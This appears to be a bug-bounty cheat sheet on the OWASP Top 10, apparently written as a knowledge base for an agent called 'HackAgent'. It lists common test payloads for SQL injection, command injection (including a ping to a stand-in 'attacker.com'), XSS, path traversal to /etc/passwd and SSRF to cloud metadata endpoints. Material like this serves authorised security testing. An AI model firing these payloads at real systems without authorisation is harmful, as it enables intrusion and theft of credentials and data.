# OWASP Top 10 (2021) - HackAgent Knowledge Base

## A01:2021 - Broken Access Control

**What:** Users can act outside their intended permissions.

**Test For:**
- IDOR: Change IDs in URLs/requests to access other users' data
- Privilege escalation: Access admin functions as regular user
- Path traversal: `../../etc/passwd`
- CORS misconfig: Check `Access-Control-Allow-Origin: *`
- Force browsing: Access `/admin` without auth

**Payloads:**
```
# IDOR
GET /api/user/123 → Change to /api/user/124

# Path traversal
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//....//etc/passwd

# Force browsing
/admin
/dashboard
/api/admin/users
```

**Bounty Range:** $500 - $20,000

---

## A02:2021 - Cryptographic Failures

**What:** Weak/missing encryption exposing sensitive data.

**Test For:**
- HTTP instead of HTTPS
- Weak SSL/TLS (SSLv3, TLS 1.0)
- Sensitive data in URL parameters
- Weak password hashing
- Hardcoded secrets in JS

**Tools:**
- `sslyze` / `testssl.sh` for TLS testing
- Browser dev tools for cookie flags
- Check response headers

**Bounty Range:** $100 - $5,000

---

## A03:2021 - Injection

**What:** Untrusted data sent to interpreter.

### SQL Injection
```sql
' OR '1'='1
' OR '1'='1' --
' UNION SELECT null,username,password FROM users--
admin'--
1' AND (SELECT SUBSTRING(username,1,1) FROM users)='a
```

### Command Injection
```bash
; ls -la
| cat /etc/passwd
`whoami`
$(id)
; ping -c 10 attacker.com
```

### XSS (Cross-Site Scripting)
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
<body onload=alert('XSS')>
"><script>alert(String.fromCharCode(88,83,83))</script>
```

**Bounty Range:** $200 - $50,000 (RCE = highest)

---

## A04:2021 - Insecure Design

**What:** Flaws in architecture/design, not implementation.

**Test For:**
- Missing rate limiting (brute force)
- No CAPTCHA on sensitive forms
- Predictable tokens/IDs
- Business logic flaws
- Missing security questions

**Examples:**
- Password reset: Can you reset other users' passwords?
- Multi-step process: Can you skip steps?
- Discounts: Can you apply negative quantities?

**Bounty Range:** $500 - $10,000

---

## A05:2021 - Security Misconfiguration

**What:** Missing hardening, default configs, verbose errors.

**Test For:**
- Default credentials (admin/admin)
- Directory listing enabled
- Stack traces in errors
- Unnecessary HTTP methods (PUT, DELETE)
- Missing security headers
- S3 buckets public

**Headers to Check:**
```
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Content-Security-Policy: ...
Strict-Transport-Security: max-age=...
X-XSS-Protection: 1; mode=block
```

**Bounty Range:** $50 - $2,000

---

## A06:2021 - Vulnerable Components

**What:** Using components with known vulnerabilities.

**Test For:**
- Outdated frameworks (check version)
- Known CVEs in dependencies
- Unpatched software

**Tools:**
- `retire.js` for JavaScript
- `npm audit` / `pip audit`
- Nuclei CVE templates
- Shodan for version fingerprinting

**Bounty Range:** $100 - $10,000 (depends on CVE)

---

## A07:2021 - Authentication Failures

**What:** Weak authentication mechanisms.

**Test For:**
- Brute force (no rate limiting)
- Default credentials
- Weak password requirements
- Session fixation
- Session tokens in URL
- Remember me insecure
- Password reset flaws

**Payloads:**
```
# Username enumeration
Valid user: "Invalid password"
Invalid user: "User not found"

# Session fixation
Set SESSIONID before login, check if same after

# Brute force
Use common passwords list
```

**Bounty Range:** $200 - $5,000

---

## A08:2021 - Software and Data Integrity Failures

**What:** Code/data integrity not verified.

**Test For:**
- Insecure deserialization
- CI/CD pipeline security
- Unsigned updates
- CDN integrity (missing SRI)

**Deserialization Payloads:**
- Java: ysoserial
- PHP: `O:8:"stdClass":0:{}`
- Python pickle
- Node.js `node-serialize`

**Bounty Range:** $500 - $25,000

---

## A09:2021 - Security Logging & Monitoring Failures

**What:** Insufficient logging to detect attacks.

**Test For:**
- Failed logins not logged
- Sensitive actions not audited
- Logs stored insecurely
- No alerting

**Usually out of scope** for bug bounties unless combined with other vulns.

---

## A10:2021 - Server-Side Request Forgery (SSRF)

**What:** App fetches remote resource without validating URL.

**Test For:**
- URL input fields
- Webhook configurations
- File import from URL
- PDF generators
- Image fetchers

**Payloads:**
```
# Internal network
http://127.0.0.1:80
http://localhost:22
http://10.0.0.1
http://169.254.169.254 (AWS metadata)

# Protocol smuggling
file:///etc/passwd
dict://localhost:11211
gopher://localhost:6379

# Bypass filters
http://127.0.0.1.nip.io
http://0x7f000001
http://2130706433
http://[::1]
```

**Bounty Range:** $500 - $30,000 (cloud metadata = high)

---

## Quick Reference Card

| Vuln | Quick Test | High Impact? |
|------|-----------|--------------|
| IDOR | Change ID in URL | ✅ Data access |
| SQLi | Add `'` to params | ✅ Database |
| XSS | `<script>alert(1)</script>` | Medium |
| SSRF | URL input → localhost | ✅ Internal access |
| Auth Bypass | Skip steps, direct access | ✅ |
| CSRF | No token on forms | Medium |
| Path Traversal | `../../../etc/passwd` | ✅ |
| Command Injection | `; id` | ✅✅ RCE |

## Priority Targets

1. **Authentication/Login** - auth bypass, brute force
2. **API endpoints** - IDOR, injection
3. **File upload** - RCE, XSS
4. **User input** - XSS, SQLi
5. **URL parameters** - injection, SSRF
6. **Admin panels** - auth bypass, logic flaws

